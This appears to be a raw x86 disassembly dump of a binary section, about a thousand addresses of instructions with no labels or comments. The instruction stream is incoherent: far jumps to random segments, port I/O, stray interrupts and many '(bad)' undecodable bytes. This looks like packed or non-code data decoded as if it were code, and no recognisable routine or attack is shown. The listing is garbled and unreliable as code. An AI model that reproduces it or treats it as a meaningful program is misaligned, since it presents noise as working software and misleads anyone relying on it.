  407a94:	sbb    eax,0xe35ae9cd
  407a99:	ret    
  407a9a:	and    BYTE PTR [edx-0x65],0x3d
  407a9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a9f:	pop    es
  407aa0:	and    DWORD PTR [edx-0x49d415a1],eax
  407aa6:	idiv   DWORD PTR [ebx+0x63d73b07]
  407aac:	dec    ebp
  407aad:	mov    bl,0x1f
  407aaf:	mov    esi,DWORD PTR [ecx-0x48ada6d8]
  407ab5:	out    dx,eax
  407ab6:	add    dl,BYTE PTR [eax+0x3e]
  407ab9:	xchg   edx,eax
  407aba:	xlat   BYTE PTR ds:[ebx]
  407abb:	out    0x18,eax
  407abd:	pop    esi
  407abe:	xchg   esi,eax
  407abf:	add    al,bh
  407ac1:	jl     0x407afc
  407ac3:	in     al,dx
  407ac4:	mov    ah,0x7a
  407ac6:	push   edx
  407ac7:	dec    edx
  407ac8:	push   esi
  407ac9:	(bad)  
  407aca:	sbb    ch,BYTE PTR [ecx]
  407acc:	push   edi
  407acd:	in     al,0x2f
  407acf:	inc    edi
  407ad0:	inc    esp
  407ad1:	xchg   ecx,eax
  407ad2:	add    dh,BYTE PTR [eax]
  407ad4:	ja     0x407b25
  407ad6:	leave  
  407ad7:	xchg   esp,eax
  407ad8:	repz sub dl,bl
  407adb:	call   0x7b4d:0x2320b71f
  407ae2:	rcl    DWORD PTR [edi-0x4],1
  407ae5:	jmp    0x6ede:0xb7480dfe
  407aec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407aed:	test   eax,0x603f46e3
  407af2:	and    ecx,DWORD PTR [edi+0x1e]
  407af5:	shl    ebx,0x11
  407af8:	xor    BYTE PTR [ecx*2-0xd258bd7],dh
  407aff:	push   ss
  407b00:	stc    
  407b01:	add    al,0x10
  407b03:	adc    DWORD PTR [edx+ebx*2],ebx
  407b06:	pop    esi
  407b07:	sbb    dh,BYTE PTR [edx+edi*1]
  407b0a:	mov    al,0xef
  407b0c:	ins    DWORD PTR es:[edi],dx
  407b0d:	in     al,dx
  407b0e:	js     0x407a96
  407b10:	pop    esi
  407b11:	test   BYTE PTR [ebp+0x18a0d483],al
  407b17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b18:	stos   DWORD PTR es:[edi],eax
  407b19:	retf   
  407b1a:	daa    
  407b1b:	fnstcw WORD PTR [ebx-0x45]
  407b1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b1f:	addr16 ret 
  407b21:	sub    ebx,DWORD PTR [edx]
  407b23:	mov    dh,0x44
  407b25:	xor    eax,DWORD PTR [edi+0x2ebb57a1]
  407b2b:	pop    ebp
  407b2c:	outs   dx,BYTE PTR ds:[esi]
  407b2d:	call   0xf4aeef8
  407b32:	xor    edi,ebp
  407b34:	inc    esp
  407b35:	test   BYTE PTR [edx+0x28],ah
  407b38:	adc    eax,0x11189c58
  407b3d:	mov    ebp,0x3a1916a7
  407b42:	inc    ebx
  407b43:	pop    esi
  407b44:	xchg   edi,eax
  407b45:	mov    BYTE PTR [edx-0x31],dl
  407b48:	and    ecx,DWORD PTR [ebp-0x55]
  407b4b:	div    DWORD PTR [eax]
  407b4d:	clc    
  407b4e:	or     al,BYTE PTR [ecx-0x62]
  407b51:	or     ch,BYTE PTR [ebp-0x404e4c0f]
  407b57:	rcl    DWORD PTR [eax-0x10c276c0],0x0
  407b5e:	fist   WORD PTR [edi-0x398647c3]
  407b64:	popa   
  407b65:	ins    BYTE PTR es:[edi],dx
  407b66:	sbb    edi,esi
  407b68:	cmp    eax,0x7dbff8d5
  407b6d:	add    BYTE PTR [ebp+ebp*4+0x26776acf],dl
  407b74:	add    dh,BYTE PTR [esi+0x4d]
  407b77:	inc    edi
  407b78:	xchg   edx,eax
  407b79:	mov    esp,0x63e3920e
  407b7e:	lahf   
  407b7f:	ds cdq 
  407b81:	cli    
  407b82:	in     eax,0xa0
  407b84:	xchg   edi,eax
  407b85:	pop    ebx
  407b86:	pusha  
  407b87:	adc    ebx,DWORD PTR [eax-0x5c3e44a0]
  407b8d:	add    eax,0x8a7fdccc
  407b92:	int    0xba
  407b94:	retf   0xfa92
  407b97:	rol    DWORD PTR [esi],cl
  407b99:	jo     0x407b3a
  407b9b:	(bad)  
  407b9d:	mov    edx,0xcbc28307
  407ba2:	cmp    eax,0x2c168ec4
  407ba7:	outs   dx,BYTE PTR ds:[esi]
  407ba8:	shl    BYTE PTR [edi+edx*8],cl
  407bab:	retf   0x5b0c
  407bae:	sub    DWORD PTR [ebp+edi*2+0x4feb1564],0x7a0d4f2b
  407bb9:	imul   edx,DWORD PTR ds:0x850c0f31,0xe2f791e3
  407bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bc4:	pop    ds
  407bc5:	loopne 0x407be7
  407bc7:	adc    eax,0x96469de9
  407bcc:	add    ch,BYTE PTR [esi+0x78]
  407bcf:	fcomp  DWORD PTR [edx+0x3a92be62]
  407bd5:	loope  0x407bb1
  407bd7:	rcl    eax,0x26
  407bda:	dec    ebp
  407bdb:	sbb    bh,dh
  407bdd:	out    dx,al
  407bde:	jo     0x407c3a
  407be0:	adc    DWORD PTR [edi-0x40],esi
  407be3:	shr    BYTE PTR [esi],cl
  407be5:	(bad)  
  407be6:	and    BYTE PTR [edx+0x78378b08],dh
  407bec:	xor    edx,eax
  407bee:	imul   esi,DWORD PTR [eax],0xb50176b4
  407bf4:	dec    esp
  407bf5:	in     al,dx
  407bf6:	pop    ebx
  407bf7:	mov    bh,BYTE PTR [eax]
  407bf9:	pop    ebp
  407bfa:	sub    eax,0x536b095c
  407bff:	sbb    ah,cl
  407c01:	lea    esp,[esi]
  407c03:	mov    ah,BYTE PTR [ebp-0x4fbb47be]
  407c09:	sar    DWORD PTR [edi-0x29],1
  407c0c:	mov    cs,ebp
  407c0e:	arpl   cx,dx
  407c10:	inc    ecx
  407c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c12:	push   ecx
  407c13:	(bad)  
  407c15:	hlt    
  407c16:	xchg   ebp,eax
  407c17:	out    dx,al
  407c18:	push   es
  407c19:	sub    eax,0x50f157bc
  407c1e:	imul   edx,DWORD PTR [edx-0x23d9490f],0xfffffff7
  407c25:	shl    DWORD PTR [edx+0x617f2e0e],0x6c
  407c2c:	scas   al,BYTE PTR es:[edi]
  407c2d:	jge    0x407c2d
  407c2f:	stc    
  407c30:	les    ebp,FWORD PTR [ebx+0x69872388]
  407c36:	push   cs
  407c37:	call   0x13d3:0x27701508
  407c3e:	mov    ebx,0x36c0fa
  407c43:	(bad)  
  407c44:	mov    ebx,0x6948aab0
  407c49:	xlat   BYTE PTR ds:[ebx]
  407c4a:	pushf  
  407c4b:	jge    0x407be8
  407c4d:	test   BYTE PTR ds:0xfe0936b1,dh
  407c53:	push   eax
  407c54:	hlt    
  407c55:	ins    BYTE PTR es:[edi],dx
  407c56:	cmp    bh,BYTE PTR [ebx-0x75061f79]
  407c5c:	jg     0x407c7c
  407c5e:	jne    0x407bfd
  407c60:	data16 jb 0x407c9f
  407c63:	imul   edi,DWORD PTR [edi-0x6492af3d],0x95a13c35
  407c6d:	retf   
  407c6e:	sub    bh,al
  407c70:	retf   0x6afc
  407c73:	mov    dl,0x49
  407c75:	jnp    0x407c41
  407c77:	cld    
  407c78:	adc    eax,0x3fd4103f
  407c7d:	inc    ebp
  407c7e:	and    BYTE PTR ds:0x4fb0d514,dh
  407c84:	sub    eax,0xa53a6f24
  407c89:	jmp    0x77247444
  407c8e:	(bad)  
  407c8f:	or     BYTE PTR [edx+0x6f79b588],0xcb
  407c96:	mov    ebx,0x158b7fae
  407c9b:	xchg   esi,eax
  407c9c:	std    
  407c9d:	call   0x3667:0x7b4c6f7e
  407ca4:	xor    DWORD PTR [ecx+ecx*2+0x21e6ccbc],0xffffffce
  407cac:	cmp    eax,0xb68707ac
  407cb1:	test   BYTE PTR [ebp-0x12],al
  407cb4:	pop    edx
  407cb5:	repnz retf 
  407cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cb8:	sub    eax,DWORD PTR [ebp+0x252cb44f]
  407cbe:	or     DWORD PTR [edi+0x59118bba],0x4f
  407cc5:	mov    bl,0x26
  407cc7:	(bad)  
  407cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cc9:	push   ss
  407cca:	sub    BYTE PTR [eax+0x72],ch
  407ccd:	les    esp,FWORD PTR [edx]
  407ccf:	sub    eax,0x4f455c7d
  407cd4:	(bad)  
  407cd5:	inc    edx
  407cd6:	jg     0x407c77
  407cd8:	(bad)  
  407cd9:	mov    edx,0xcbbde760
  407cde:	sbb    ebx,DWORD PTR [eax]
  407ce0:	or     DWORD PTR [ebx],eax
  407ce2:	and    ah,BYTE PTR [eax+ebp*2]
  407ce5:	cwde   
  407ce6:	in     al,dx
  407ce7:	ins    DWORD PTR es:[edi],dx
  407ce8:	mov    dh,0x8
  407cea:	test   eax,0x27f561f6
  407cef:	or     DWORD PTR ds:0xf1720bf0,ecx
  407cf5:	mov    ebp,0xbca7d2d8
  407cfa:	popa   
  407cfb:	stos   WORD PTR es:[edi],ax
  407cfd:	xchg   ebx,eax
  407cfe:	fucomip st,st(2)
  407d00:	int    0x21
  407d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d05:	rcr    DWORD PTR [eax-0x76],1
  407d08:	add    bl,BYTE PTR [ebx+ebp*2]
  407d0b:	jmp    0x407d2e
  407d0d:	mov    esp,0x7a94954d
  407d12:	inc    ecx
  407d13:	imul   ecx,DWORD PTR [eax],0xffffffc7
  407d16:	jb     0x407d8f
  407d18:	mov    eax,ds:0x905776b5
  407d1d:	shl    ebp,0x4
  407d20:	lock dec esi
  407d22:	in     al,dx
  407d23:	adc    eax,DWORD PTR [ecx+0x6]
  407d26:	sbb    al,0xb7
  407d28:	mov    ds,WORD PTR [ecx-0x626bbc63]
  407d2e:	jbe    0x407cfc
  407d30:	mov    cl,0x20
  407d32:	test   DWORD PTR [eax],edi
  407d34:	or     BYTE PTR [edi-0x24732cf8],al
  407d3a:	xchg   edi,eax
  407d3b:	popf   
  407d3c:	xchg   esi,eax
  407d3d:	mov    DWORD PTR [ebx+0x7103ad63],ecx
  407d43:	adc    cl,BYTE PTR [ebx-0x4c]
  407d46:	inc    ebp
  407d47:	fwait
  407d48:	and    DWORD PTR [edi+0x73],ebx
  407d4b:	dec    edi
  407d4c:	jmp    0x51027e9a
  407d51:	(bad)  
  407d52:	(bad)  
  407d53:	(bad)  
  407d54:	gs clc 
  407d56:	jg     0x407dc4
  407d58:	(bad)
  407d5c:	and    BYTE PTR [edx+0x2a22b6e5],ah
  407d62:	xor    eax,0xbe304d06
  407d67:	sahf   
  407d68:	and    al,0x26
  407d6a:	and    BYTE PTR [eax],bl
  407d6c:	out    0x19,eax
  407d6e:	div    ebp
  407d70:	es jg  0x407db4
  407d73:	inc    ebp
  407d74:	test   al,0x3
  407d76:	test   BYTE PTR ss:[ebx-0x63],bh
  407d7a:	nop
  407d7b:	je     0x407d29
  407d7d:	fisttp WORD PTR [esi+ebx*2]
  407d80:	pushf  
  407d81:	sub    ah,BYTE PTR [edi+0x125f30ee]
  407d87:	pop    ecx
  407d88:	lea    ecx,[ecx+ebx*4-0x50e64335]
  407d8f:	cld    
  407d90:	jbe    0x407de3
  407d92:	call   DWORD PTR [edx-0x2e]
  407d95:	pop    ecx
  407d96:	out    0xaa,eax
  407d98:	test   al,0x92
  407d9a:	out    0x93,eax
  407d9c:	sbb    al,dl
  407d9e:	sbb    al,0xaf
  407da0:	add    ebx,DWORD PTR [esi]
  407da2:	fld    st(3)
  407da4:	jge    0x407da7
  407da6:	rcr    bl,0xd6
  407da9:	sbb    BYTE PTR [ecx+0x74],0xd0
  407dad:	mov    edi,0xbefa41d6
  407db2:	and    eax,0x5ea52395
  407db7:	cld    
  407db8:	mov    esp,0x3b7d976
  407dbd:	jmp    0xf8a5ce36
  407dc2:	xchg   ebp,eax
  407dc4:	int3   
  407dc5:	xchg   esi,eax
  407dc6:	xchg   DWORD PTR ds:0xc8f187d4,ebx
  407dcc:	fwait
  407dcd:	push   0xd04ae657
  407dd2:	pop    ds
  407dd3:	setb   BYTE PTR [edx+0x16f1cee5]
  407dda:	jg     0x407dfd
  407ddc:	mov    ecx,?
  407dde:	mov    edx,0x3cc15bc2
  407de3:	sbb    eax,0xa3597e3e
  407de8:	mov    cl,0xae
  407dea:	cdq    
  407deb:	std    
  407dec:	repnz jecxz 0x407d87
  407def:	loope  0x407dc4
  407df1:	and    edx,DWORD PTR ds:0x6b10ed8e
  407df7:	adc    esi,DWORD PTR [ebx+edi*2-0x53af2480]
  407dfe:	inc    eax
  407dff:	test   DWORD PTR gs:[ecx-0x2af57252],0x873cd658
  407e0a:	mov    ah,0xb4
  407e0c:	push   eax
  407e0d:	into   
  407e0e:	stos   BYTE PTR es:[edi],al
  407e0f:	mov    ds:0xbf244352,eax
  407e14:	sar    DWORD PTR [esi],0x75
  407e17:	cmp    BYTE PTR [eax-0x234bcc0e],0x5f
  407e1e:	sbb    eax,0xb8cc27bb
  407e23:	leave  
  407e24:	mov    edx,ebp
  407e26:	adc    eax,0x34e9569e
  407e2b:	pop    ss
  407e2c:	jae    0x407e20
  407e2e:	jae    0x407e36
  407e30:	mov    al,0xd0
  407e32:	pop    ds
  407e33:	retf   
  407e34:	sbb    BYTE PTR [eax-0x34179541],0x6b
  407e3b:	xchg   DWORD PTR [esi+0x4e901655],esp
  407e41:	scas   al,BYTE PTR es:[edi]
  407e42:	dec    edi
  407e43:	rcr    dh,1
  407e45:	add    BYTE PTR [eax-0x3f],0xde
  407e49:	mov    al,ds:0xba0fe7cb
  407e4e:	adc    dh,BYTE PTR [edi+0x21f37e40]
  407e54:	jns    0x407e4d
  407e56:	out    0x3d,eax
  407e58:	dec    esp
  407e59:	mov    dh,0x50
  407e5b:	xchg   BYTE PTR [edx],bh
  407e5d:	xor    eax,0x61869f78
  407e62:	das    
  407e63:	dec    edi
  407e64:	jno    0x407df4
  407e66:	repz pop ebp
  407e68:	sbb    al,0x37
  407e6a:	out    dx,eax
  407e6b:	pop    edx
  407e6c:	or     BYTE PTR [eax+0x3f06e61d],bl
  407e72:	or     eax,0xa4b67bf7
  407e77:	pop    ss
  407e78:	pop    ss
  407e79:	cmp    eax,0x4f3ffdb9
  407e7e:	or     DWORD PTR [edx+0x9],esi
  407e81:	aas    
  407e82:	mov    ds,WORD PTR [ecx-0x730e1e69]
  407e88:	imul   esp,DWORD PTR [ebp+0x1f7ae600],0x3b4cfe7e
  407e92:	call   0xa13c:0x62a614c7
  407e99:	jnp    0x407e1d
  407e9b:	out    dx,al
  407e9c:	rol    DWORD PTR [eax*1-0x2a69a70b],1
  407ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea4:	(bad)  
  407ea5:	mov    dh,0xe8
  407ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea8:	dec    ebx
  407ea9:	jae    0x407ead
  407eab:	pusha  
  407eac:	dec    ebp
  407ead:	push   ebx
  407eae:	adc    DWORD PTR [eax-0x38],0x55
  407eb2:	test   eax,0x14273ef6
  407eb7:	enter  0x7f6c,0x22
  407ebb:	inc    ecx
  407ebc:	mov    eax,ds:0x3581521
  407ec1:	xlat   BYTE PTR ds:[ebx]
  407ec2:	inc    ebx
  407ec3:	ds push cs
  407ec5:	mov    bh,0x19
  407ec7:	test   ecx,0x4e9c4041
  407ecd:	dec    edx
  407ece:	inc    ecx
  407ecf:	inc    ebp
  407ed0:	(bad)  [edx]
  407ed2:	je     0x407e90
  407ed4:	popf   
  407ed5:	pop    esi
  407ed6:	cmp    DWORD PTR [eax+ecx*8-0x1874717e],0xd3c67348
  407ee1:	push   ds
  407ee2:	aas    
  407ee3:	fs pushf 
  407ee5:	frstor [edx+0x317f9382]
  407eeb:	and    eax,0x9fb0dc3e
  407ef1:	adc    ch,dl
  407ef3:	jmp    0x1fa8:0x3d151b5e
  407efa:	jbe    0x407f2b
  407efc:	mov    edi,0xeec4df2d
  407f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f02:	stos   BYTE PTR es:[edi],al
  407f03:	daa    
  407f04:	sbb    ebx,ebp
  407f06:	add    DWORD PTR ds:0x797e42f5,0x47
  407f0d:	in     eax,dx
  407f0e:	sbb    al,0xf6
  407f10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f12:	aam    0x92
  407f14:	xchg   DWORD PTR [eax+0x4],eax
  407f17:	fs ret 
  407f19:	(bad)  
  407f1a:	and    eax,0xe45d71c
  407f1f:	adc    BYTE PTR [ebx],dl
  407f21:	push   ebp
  407f22:	or     al,0x47
  407f24:	mov    dh,0xc4
  407f26:	cmp    al,0x1
  407f28:	scas   al,BYTE PTR es:[edi]
  407f29:	mov    ch,cl
  407f2b:	icebp  
  407f2c:	std    
  407f2d:	cmp    DWORD PTR [esi],ebx
  407f2f:	scas   eax,DWORD PTR es:[edi]
  407f30:	xor    BYTE PTR gs:[ebp+0x42444703],al
  407f37:	pop    ds
  407f38:	out    dx,al
  407f39:	cli    
  407f3a:	not    DWORD PTR [esp+eiz*8]
  407f3d:	jl     0x407f61
  407f3f:	fcomp  QWORD PTR [ecx+esi*4]
  407f42:	cli    
  407f43:	inc    eax
  407f44:	mov    esp,0x9411f69a
  407f49:	lds    ebp,FWORD PTR [edx+0x40513a5d]
  407f4f:	pop    es
  407f50:	sahf   
  407f51:	sub    bh,bh
  407f53:	adc    BYTE PTR [ebp+0x32957534],dl
  407f59:	jno    0x407f63
  407f5b:	xor    esp,DWORD PTR [edi+0x5b]
  407f5e:	jnp    0x407f77
  407f60:	sub    BYTE PTR [edx+0x20],dl
  407f63:	shl    dh,0x8f
  407f66:	jmp    0x2ef4:0xee83a300
  407f6d:	aad    0x31
  407f6f:	cmp    al,BYTE PTR [edx+0x23]
  407f72:	rol    BYTE PTR [ebp-0xc],1
  407f75:	push   esi
  407f76:	loope  0x407f06
  407f78:	test   al,0xbd
  407f7a:	mov    esp,0x2b4dd3d
  407f7f:	mov    al,ds:0x28e6e2e4
  407f84:	push   es
  407f85:	pop    es
  407f86:	or     BYTE PTR [ebp-0x46cc1f00],dh
  407f8c:	xor    edi,DWORD PTR [edx]
  407f8e:	test   ebx,esi
  407f90:	sbb    eax,DWORD PTR [edi]
  407f92:	add    eax,0xfa4011c0
  407f97:	and    BYTE PTR [ebx+esi*8-0x33],al
  407f9b:	stos   BYTE PTR es:[edi],al
  407f9c:	(bad)  
  407f9d:	cmp    dh,ah
  407f9f:	sub    edi,DWORD PTR [esi]
  407fa1:	fild   QWORD PTR [esi]
  407fa3:	mov    edx,0x2b144fb5
  407fa8:	rcr    BYTE PTR [esi+0x41],cl
  407fab:	aas    
  407fac:	sbb    DWORD PTR [edx],esi
  407fae:	call   0x6291:0x5171a88f
  407fb5:	data16 das 
  407fb7:	jle    0x407ff2
  407fb9:	push   ss
  407fba:	adc    al,0x1a
  407fbc:	dec    esp
  407fbd:	push   ss
  407fbe:	cld    
  407fbf:	clc    
  407fc0:	fcomp  QWORD PTR [esi+0x67]
  407fc3:	jnp    0x407ff7
  407fc5:	adc    eax,0xa6bb5e80
  407fca:	dec    edi
  407fcb:	lods   al,BYTE PTR ds:[esi]
  407fcc:	pop    ds
  407fcd:	sub    dl,BYTE PTR [ecx]
  407fcf:	adc    cl,BYTE PTR [eax]
  407fd1:	mov    al,0x54
  407fd3:	fimul  DWORD PTR [edx+0x215cbe5f]
  407fd9:	xchg   ebx,eax
  407fda:	cmp    BYTE PTR [ebx-0x3028ae44],bh
  407fe0:	pop    ss
  407fe1:	lods   eax,DWORD PTR ds:[esi]
  407fe2:	rcr    BYTE PTR [edi+0x3fca936f],0xd8
  407fe9:	fwait
  407fea:	cmp    ah,BYTE PTR [esp+eiz*4+0x72e03d85]
  407ff1:	or     ebp,DWORD PTR [ecx-0x73]
  407ff4:	pop    eax
  407ff5:	push   ebp
  407ff6:	mov    edi,0x16571ece
  407ffb:	out    0xa,al
  407ffd:	(bad)  
  407ffe:	ins    BYTE PTR es:[edi],dx
  407fff:	adc    ebx,DWORD PTR [ebx]
  408001:	test   DWORD PTR [edi-0x7a],ebp
  408004:	fadd   DWORD PTR cs:[edi]
  408007:	pushf  
  408008:	jae    0x40800d
  40800a:	clc    
  40800b:	call   DWORD PTR [esi]
  40800d:	cmp    eax,ebx
  40800f:	jmp    0x38b2b789
  408014:	fcmove st,st(5)
  408016:	ins    DWORD PTR es:[edi],dx
  408017:	imul   ebx,DWORD PTR [esi],0x73
  40801a:	sar    BYTE PTR [edi+ebp*2],1
  40801d:	jl     0x407fc2
  40801f:	popa   
  408020:	sbb    eax,0x617cc77a
  408025:	test   BYTE PTR [ebx],0xeb
  408028:	inc    esp
  408029:	mov    bh,0x10
  40802b:	aaa    
  40802c:	mov    eax,ds:0xc61ca302
  408031:	rcl    DWORD PTR [edx+0xa123fdd],0xf8
  408038:	shl    bl,1
  40803a:	jo     0x408095
  40803c:	loop   0x408095
  40803e:	mov    cl,0x40
  408040:	ins    BYTE PTR es:[edi],dx
  408041:	(bad)  
  408042:	xor    eax,0xbe3da3ad
  408047:	je     0x40803b
  408049:	cmp    DWORD PTR [eax],edi
  40804b:	fwait
  40804c:	jbe    0x40804f
  40804e:	jo     0x4080ae
  408050:	mov    edi,0x94397240
  408055:	push   cs
  408056:	mov    DWORD PTR [ecx-0x29fb6bd2],eax
  40805c:	mov    ebp,0x2854dafb
  408061:	aam    0x2b
  408063:	fwait
  408064:	popa   
  408065:	ins    DWORD PTR es:[edi],dx
  408066:	xchg   esp,eax
  408067:	repnz or al,0xf5
  40806a:	aas    
  40806b:	sbb    ah,BYTE PTR [ebx+eiz*4+0x5597e8c]
  408072:	div    DWORD PTR [eax]
  408074:	cli    
  408075:	sbb    BYTE PTR [esi+0x58],bh
  408078:	mov    WORD PTR [ebp-0x43],ds
  40807b:	mov    eax,ds:0xfe69bece
  408080:	hlt    
  408081:	mov    eax,0x8c912f2d
  408086:	leave  
  408087:	sbb    bl,BYTE PTR [eax+0x5e1bbd2d]
  40808d:	(bad)  
  40808e:	mov    dl,0x6a
  408090:	push   0xffffffe2
  408092:	mov    esi,ds
  408094:	sti    
  408095:	in     al,0x85
  408097:	sub    ebp,0x29
  40809a:	xor    DWORD PTR [ebx],ebp
  40809c:	push   ecx
  40809d:	jecxz  0x408037
  40809f:	pop    edi
  4080a0:	scas   al,BYTE PTR es:[edi]
  4080a1:	jne    0x408116
  4080a3:	inc    esp
  4080a4:	imul   edx,DWORD PTR [edx],0x51
  4080a7:	imul   esp,DWORD PTR [edi+ebp*4],0x42fae4c3
  4080ae:	out    dx,al
  4080af:	das    
  4080b0:	scas   eax,DWORD PTR es:[edi]
  4080b1:	fwait
  4080b2:	inc    ebx
  4080b3:	outs   dx,BYTE PTR ds:[esi]
  4080b4:	aas    
  4080b5:	cdq    
  4080b6:	loope  0x4080f7
  4080b8:	and    BYTE PTR [ebp-0xcdae65a],0xb9
  4080bf:	add    cl,ch
  4080c1:	popf   
  4080c2:	sbb    eax,0xa69b8e33
  4080c7:	push   ss
  4080c8:	pop    es
  4080c9:	inc    edi
  4080ca:	ss sub eax,0x2d93ce93
  4080d0:	shr    DWORD PTR [ecx+ecx*2],1
  4080d3:	ja     0x4080da
  4080d5:	inc    ebx
  4080d6:	(bad)
  4080d9:	hlt    
  4080da:	into   
  4080db:	hlt    
  4080dc:	call   0xf09:0xdce74a49
  4080e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e4:	fwait
  4080e5:	push   0x30
  4080e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080e8:	mov    al,0x49
  4080ea:	sti    
  4080eb:	int    0xdc
  4080ed:	adc    ecx,edi
  4080ef:	aad    0xea
  4080f1:	inc    eax
  4080f2:	popa   
  4080f3:	mov    al,ds:0xcd09f7b1
  4080f8:	jb     0x408115
  4080fa:	cli    
  4080fb:	inc    esi
  4080fc:	jmp    0x34aa:0xf610be94
  408103:	fistp  WORD PTR [ecx-0x7279fa90]
  408109:	aam    0x42
  40810b:	and    eax,0x52adad02
  408110:	pop    ebp
  408111:	fs repnz xchg esi,eax
  408114:	fld    TBYTE PTR [eax+0x70cd7aa8]
  40811a:	clc    
  40811b:	and    al,0x33
  40811d:	xor    BYTE PTR [edx+eax*4+0x68],al
  408121:	mov    esp,0x172de0eb
  408126:	in     eax,dx
  408127:	nop
  408128:	mov    dh,0x84
  40812a:	xor    DWORD PTR [ecx],edi
  40812c:	cmp    DWORD PTR [ebp-0x3e],ebp
  40812f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408130:	ins    BYTE PTR es:[edi],dx
  408131:	daa    
  408132:	lods   eax,DWORD PTR ds:[esi]
  408133:	out    dx,eax
  408134:	mov    eax,DWORD PTR [edx+0x34438504]
  40813a:	dec    ebx
  40813b:	mov    edx,0x3d0cd0e
  408140:	jp     0x40816c
  408142:	jns    0x4080cd
  408144:	jp     0x40812b
  408146:	and    edx,0x79
  408149:	cmp    al,0x90
  40814b:	inc    ecx
  40814c:	cdq    
  40814d:	mov    ?,WORD PTR [eax+0x60]
  408150:	xor    eax,0x6dccea1f
  408155:	int    0xbe
  408157:	push   esi
  408158:	jg     0x4081c0
  40815a:	inc    ecx
  40815b:	sar    BYTE PTR [ebp-0x2b7e4d15],0xf2
  408162:	enter  0xf241,0x2d
  408166:	dec    edi
  408167:	outs   dx,BYTE PTR ds:[esi]
  408168:	loopne 0x4080f7
  40816a:	mov    edx,0x897f3615
  40816f:	leave  
  408170:	xchg   DWORD PTR [edx+0x9],ebx
  408173:	add    esi,esp
  408175:	sub    DWORD PTR [ebx-0x170fe0b8],ecx
  40817b:	lods   eax,DWORD PTR ds:[esi]
  40817c:	sub    ch,al
  40817e:	(bad)  
  40817f:	popa   
  408180:	sbb    al,0x8f
  408182:	lea    esp,[ecx+0xad78c9c]
  408188:	outs   dx,BYTE PTR ds:[esi]
  408189:	and    al,0x63
  40818b:	mov    bl,0x39
  40818d:	push   cs
  40818e:	mov    edx,ds
  408190:	imul   eax,DWORD PTR ds:0x9612c206,0x3c9c6529
  40819a:	jns    0x408158
  40819c:	push   edi
  40819d:	add    BYTE PTR [ecx+0x5dabe5e1],bl
  4081a3:	ret    
  4081a4:	leave  
  4081a5:	mov    ds:0x373e774f,al
  4081aa:	and    edx,ecx
  4081ac:	data16 fs jno 0x408130
  4081b0:	add    BYTE PTR [esi],dl
  4081b2:	or     ah,cl
  4081b4:	dec    ebp
  4081b5:	retf   
  4081b6:	xor    al,0xbf
  4081b8:	test   eax,0x3afc3be8
  4081bd:	jl     0x4081bb
  4081bf:	rcl    DWORD PTR [edi],0x23
  4081c2:	jle    0x4081f8
  4081c4:	imul   edx,DWORD PTR [ebx-0x19730c7b],0x8a67dcb0
  4081ce:	sub    al,0x61
  4081d0:	mov    bl,0x63
  4081d2:	call   0x6512db74
  4081d7:	mov    edi,DWORD PTR [ebx-0x5a1fc337]
  4081dd:	popa   
  4081de:	push   ebp
  4081df:	in     al,0x58
  4081e1:	mov    eax,0xb1e465dd
  4081e6:	sar    BYTE PTR [edi],cl
  4081e8:	xchg   ebx,eax
  4081e9:	mov    ecx,0xd052c075
  4081ee:	jb     0x40824f
  4081f0:	push   0x44
  4081f2:	cmc    
  4081f3:	lods   eax,DWORD PTR fs:[esi]
  4081f5:	jle    0x40818d
  4081f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f8:	loop   0x40819d
  4081fa:	(bad)  
  4081fb:	clc    
  4081fc:	test   eax,0x19c59769
  408201:	pop    es
  408202:	rcl    DWORD PTR [eax-0x42],0x8
  408206:	lea    ebx,[ebx-0x4e6d8ee9]
  40820c:	in     al,0x4f
  40820e:	cli    
  40820f:	jmp    0x408197
  408211:	sub    edi,edi
  408213:	out    dx,al
  408214:	int    0x28
  408216:	gs push ebp
  408218:	adc    ch,dh
  40821a:	mov    ebx,0xec2ebea2
  40821f:	add    ebx,DWORD PTR ds:0x4bd5c664
  408225:	xchg   ebp,eax
  408226:	ds add al,0x15
  408229:	imul   esp,DWORD PTR [ebx-0x5d],0x20dd8ba1
  408230:	xlat   BYTE PTR ds:[ebx]
  408231:	push   edi
  408232:	aad    0x61
  408234:	pop    edx
  408235:	inc    ecx
  408236:	dec    eax
  408237:	dec    ebx
  408238:	aas    
  408239:	icebp  
  40823a:	pop    eax
  40823b:	loope  0x408276
  40823d:	ja     0x408223
  40823f:	retf   0x865d
  408242:	lods   eax,DWORD PTR ds:[esi]
  408243:	and    BYTE PTR [eax-0x6d],al
  408246:	dec    esi
  408247:	mov    esi,0x806578f9
  40824c:	sbb    ah,dl
  40824e:	pop    esi
  40824f:	lahf   
  408250:	rcl    DWORD PTR [edi+0x4c7869c3],cl
  408256:	mov    edi,0x95fa7857
  40825b:	mov    dl,0xc1
  40825d:	mov    eax,ds:0x1cc43ea3
  408262:	cmp    ebx,DWORD PTR [ecx+0x15]
  408265:	mov    dl,0xac
  408267:	or     BYTE PTR [esi+edx*8-0x3533d26c],al
  40826e:	in     al,dx
  40826f:	out    0xee,eax
  408271:	sbb    ecx,esi
  408273:	outs   dx,DWORD PTR ds:[esi]
  408274:	enter  0xf9d3,0xf7
  408278:	cli    
  408279:	push   0x5d4a8b49
  40827e:	push   eax
